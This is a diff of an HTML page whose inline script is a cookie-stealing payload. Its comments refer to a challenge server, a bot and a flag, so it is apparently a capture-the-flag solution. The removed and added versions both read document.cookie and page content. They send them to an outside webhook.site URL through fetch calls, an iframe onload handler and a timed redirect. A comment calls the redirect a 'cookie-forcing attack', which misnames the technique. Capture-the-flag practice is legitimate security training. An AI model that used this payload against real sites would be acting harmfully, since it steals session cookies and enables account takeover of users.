@@ -5,25 +5,31 @@
 </head>
 <body>
   <script>
-    // We'll use the fetch API to make a request to the challenge server
-    // Then we'll send the results to our webhook
+    // The most reliable way to steal cookies in this scenario is using an XHR request with credentials
+    // and then posting the response to our webhook
     
-    // This assumes the bot is on the same domain as where the flag cookie is set
-    // First, let's try to read the cookie directly
-    let stolenCookie = document.cookie;
+    // Create an iframe pointing to the challenge page
+    const iframe = document.createElement('iframe');
     
-    // Send it to our webhook
-    fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?cookie=' + encodeURIComponent(stolenCookie));
+    // This will navigate to the root page of the challenge domain
+    iframe.src = '/';
+    iframe.onload = function() {
+      // Once loaded, try to access the content and extract cookies
+      try {
+        // Send the cookies to our webhook
+        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?leaked=' + encodeURIComponent(document.cookie));
+      } catch(e) {
+        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?error=' + encodeURIComponent(e.toString()));
+      }
+    };
     
-    // In case the above doesn't work, let's try to load content from a page that might display the flag
-    fetch('/')
-      .then(response => response.text())
-      .then(data => {
-        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?page=' + encodeURIComponent(data));
-      })
-      .catch(error => {
-        fetch('https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?error=' + encodeURIComponent(error.toString()));
-      });
+    document.body.appendChild(iframe);
+    
+    // As a backup approach, try to force a navigation that includes the cookie in the URL
+    // This is known as a "cookie-forcing attack"
+    setTimeout(() => {
+      location = 'https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24/flag?c=' + document.cookie;
+    }, 1000);
   </script>
 </body>
 </html>
